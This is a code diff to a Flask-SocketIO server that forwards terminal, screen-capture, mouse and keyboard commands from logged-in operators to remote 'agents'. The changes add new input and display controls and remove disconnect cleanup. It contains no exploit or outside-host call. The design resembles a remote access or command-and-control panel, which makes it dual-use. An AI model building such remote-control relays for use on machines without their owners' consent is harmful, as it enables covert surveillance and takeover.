@@ -49,12 +49,22 @@ def init_socket_handlers(socketio):
             result = c.fetchone()
             conn.close()
 
-            if result and result[0] == 1:
+            if (result and result[0] == 1) or data['agent_id'] in active_agents:
                 emit('status', {
                     'status': 'connected',
                     'agent_id': data['agent_id']
                 }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
-                print(f"[SocketIO] Agent {data['agent_id']} already connected, sent status update")
+                emit('get_current_dir', {
+                    'agent_id': data['agent_id']
+                }, room=f"agent_{data['agent_id']}", namespace='/terminal')
+                print(f"[SocketIO] Agent {data['agent_id']} already connected, sent status update and requested current_dir")
+
+    @socketio.on('get_current_dir', namespace='/terminal')
+    def handle_get_current_dir(data):
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            if agent_id:
+                emit('get_current_dir', {'agent_id': agent_id}, room=f"agent_{agent_id}", namespace='/terminal')
 
     @socketio.on('ws_control', namespace='/terminal')
     def handle_ws_control(data):
@@ -89,17 +99,6 @@ def init_socket_handlers(socketio):
                 }, room=f"terminal_{agent_id}", namespace='/terminal')
 
                 print(f"[SocketIO] WebSocket stopped for agent {agent_id}")
-
-    @socketio.on('disconnect', namespace='/terminal')
-    def handle_terminal_disconnect():
-        nonlocal connection_count
-        connection_count -= 1
-        print(f"[SocketIO] Terminal client disconnected. Total connections: {connection_count}")
-
-        # Emit stop_keep_alive to all agents when terminal disconnects
-        for agent_id in active_agents:
-            emit('stop_keep_alive', {}, room=f"agent_{agent_id}", namespace='/terminal')
-            print(f"[SocketIO] Sent stop_keep_alive to agent {agent_id}")
 
     @socketio.on('agent_connect', namespace='/terminal')
     def handle_agent_connect(data):
@@ -1000,12 +999,15 @@ result = list_users()
             result = c.fetchone()
             conn.close()
 
-            if result and result[0] == 1:
+            if (result and result[0] == 1) or data['agent_id'] in remote_desktop_active_agents:
                 emit('status', {
                     'status': 'connected',
                     'agent_id': data['agent_id']
                 }, room=f"remote_desktop_{data['agent_id']}", namespace='/remote_desktop')
-                print(f"[SocketIO] Agent {data['agent_id']} already connected to remote desktop, sent status update")
+                emit('request_keyframe', {
+                    'agent_id': data['agent_id']
+                }, room=f"agent_{data['agent_id']}", namespace='/remote_desktop')
+                print(f"[SocketIO] Agent {data['agent_id']} already connected to remote desktop, requested keyframe")
 
     @socketio.on('rd_control', namespace='/remote_desktop')
     def handle_rd_control(data):
@@ -1045,29 +1047,6 @@ result = list_users()
                 }, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')
 
                 print(f"[SocketIO] Remote Desktop stopped for agent {agent_id}")
-
-    @socketio.on('disconnect', namespace='/remote_desktop')
-    def handle_remote_desktop_disconnect():
-        nonlocal connection_count
-        connection_count -= 1
-        print(f"[SocketIO] Remote Desktop client disconnected. Total connections: {connection_count}")
-
-        # Clean up all agent connections
-        for agent_id in list(remote_desktop_active_agents.keys()):
-            try:
-                emit('stop_screenshots', {}, room=f"agent_{agent_id}", namespace='/remote_desktop')
-                remote_desktop_active_agents.pop(agent_id, None)
-                
-                # Update database
-                conn = sqlite3.connect(CONFIG.database)
-                c = conn.cursor()
-                c.execute("UPDATE agents SET rd_connected=0 WHERE id=?", (agent_id,))
-                conn.commit()
-                conn.close()
-                
-                print(f"[SocketIO] Cleaned up agent {agent_id} on remote desktop disconnect")
-            except Exception as e:
-                print(f"[SocketIO] Error cleaning up agent {agent_id}: {str(e)}")
 
     @socketio.on('agent_connect', namespace='/remote_desktop')
     def handle_remote_desktop_agent_connect(data):
@@ -1168,13 +1147,46 @@ result = list_users()
         if current_user.is_authenticated:
             agent_id = data.get('agent_id')
             quality = data.get('quality')
-            if not agent_id or quality not in ['low', 'medium', 'high']:
+            if not agent_id or quality not in ['low', 'medium', 'high', 'ultra']:
                 print("[SocketIO] change_quality event missing agent_id or invalid quality")
                 return
             print(f"[SocketIO] Forwarding quality change to agent {agent_id}: {quality}")
-            # Forward the quality change to the agent's room
             emit('change_quality', {
                 'quality': quality,
+                'agent_id': agent_id
+            }, room=f"agent_{agent_id}", namespace='/remote_desktop')
+
+    @socketio.on('change_fps', namespace='/remote_desktop')
+    def handle_change_fps(data):
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            fps = data.get('fps')
+            if not agent_id or not fps:
+                return
+            emit('change_fps', {
+                'fps': int(fps),
+                'agent_id': agent_id
+            }, room=f"agent_{agent_id}", namespace='/remote_desktop')
+
+    @socketio.on('change_monitor', namespace='/remote_desktop')
+    def handle_change_monitor(data):
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            monitor_index = data.get('monitor_index')
+            if not agent_id or monitor_index is None:
+                return
+            emit('change_monitor', {
+                'monitor_index': int(monitor_index),
+                'agent_id': agent_id
+            }, room=f"agent_{agent_id}", namespace='/remote_desktop')
+
+    @socketio.on('request_keyframe', namespace='/remote_desktop')
+    def handle_request_keyframe(data):
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            if not agent_id:
+                return
+            emit('request_keyframe', {
                 'agent_id': agent_id
             }, room=f"agent_{agent_id}", namespace='/remote_desktop')
 
@@ -1185,7 +1197,6 @@ result = list_users()
             x = data.get('x')
             y = data.get('y')
             if not agent_id or x is None or y is None:
-                print("[SocketIO] mouse_move event missing agent_id, x, or y")
                 return
             emit('mouse_move', {
                 'x': x,
@@ -1200,10 +1211,59 @@ result = list_users()
             x = data.get('x')
             y = data.get('y')
             button = data.get('button', 'left')
+            clicks = data.get('clicks', 1)
             if not agent_id or x is None or y is None:
-                print("[SocketIO] mouse_click event missing agent_id, x, or y")
                 return
             emit('mouse_click', {
+                'x': x,
+                'y': y,
+                'button': button,
+                'clicks': clicks,
+                'agent_id': agent_id
+            }, room=f"agent_{agent_id}", namespace='/remote_desktop')
+
+    @socketio.on('mouse_dblclick', namespace='/remote_desktop')
+    def handle_mouse_dblclick(data):
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            x = data.get('x')
+            y = data.get('y')
+            button = data.get('button', 'left')
+            if not agent_id or x is None or y is None:
+                return
+            emit('mouse_dblclick', {
+                'x': x,
+                'y': y,
+                'button': button,
+                'agent_id': agent_id
+            }, room=f"agent_{agent_id}", namespace='/remote_desktop')
+
+    @socketio.on('mouse_down', namespace='/remote_desktop')
+    def handle_mouse_down(data):
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            x = data.get('x')
+            y = data.get('y')
+            button = data.get('button', 'left')
+            if not agent_id or x is None or y is None:
+                return
+            emit('mouse_down', {
+                'x': x,
+                'y': y,
+                'button': button,
+                'agent_id': agent_id
+            }, room=f"agent_{agent_id}", namespace='/remote_desktop')
+
+    @socketio.on('mouse_up', namespace='/remote_desktop')
+    def handle_mouse_up(data):
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            x = data.get('x')
+            y = data.get('y')
+            button = data.get('button', 'left')
+            if not agent_id or x is None or y is None:
+                return
+            emit('mouse_up', {
                 'x': x,
                 'y': y,
                 'button': button,
@@ -1217,13 +1277,14 @@ result = list_users()
             x = data.get('x')
             y = data.get('y')
             direction = data.get('direction', 'down')
+            amount = data.get('amount', 3)
             if not agent_id or x is None or y is None:
-                print("[SocketIO] mouse_scroll event missing agent_id, x, or y")
                 return
             emit('mouse_scroll', {
                 'x': x,
                 'y': y,
                 'direction': direction,
+                'amount': amount,
                 'agent_id': agent_id
             }, room=f"agent_{agent_id}", namespace='/remote_desktop')
 
@@ -1237,9 +1298,7 @@ result = list_users()
             ctrlKey = data.get('ctrlKey', False)
             altKey = data.get('altKey', False)
             if not agent_id or not key:
-                print("[SocketIO] keyboard_press event missing agent_id or key")
                 return
-            print(f"[SocketIO] Forwarding keyboard press to agent {agent_id}: {key} (code: {keyCode})")
             emit('keyboard_press', {
                 'key': key,
                 'keyCode': keyCode,
@@ -1256,12 +1315,36 @@ result = list_users()
             key = data.get('key')
             keyCode = data.get('keyCode')
             if not agent_id or not key:
-                print("[SocketIO] keyboard_release event missing agent_id or key")
                 return
-            print(f"[SocketIO] Forwarding keyboard release to agent {agent_id}: {key} (code: {keyCode})")
             emit('keyboard_release', {
                 'key': key,
                 'keyCode': keyCode,
+                'agent_id': agent_id
+            }, room=f"agent_{agent_id}", namespace='/remote_desktop')
+
+    @socketio.on('keyboard_type', namespace='/remote_desktop')
+    def handle_keyboard_type(data):
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            text = data.get('text', '')
+            press_enter = data.get('enter', False)
+            if not agent_id or not text:
+                return
+            emit('keyboard_type', {
+                'text': text,
+                'enter': bool(press_enter),
+                'agent_id': agent_id
+            }, room=f"agent_{agent_id}", namespace='/remote_desktop')
+
+    @socketio.on('keyboard_hotkey', namespace='/remote_desktop')
+    def handle_keyboard_hotkey(data):
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            keys = data.get('keys', [])
+            if not agent_id or not isinstance(keys, list) or not keys:
+                return
+            emit('keyboard_hotkey', {
+                'keys': keys,
                 'agent_id': agent_id
             }, room=f"agent_{agent_id}", namespace='/remote_desktop')
 
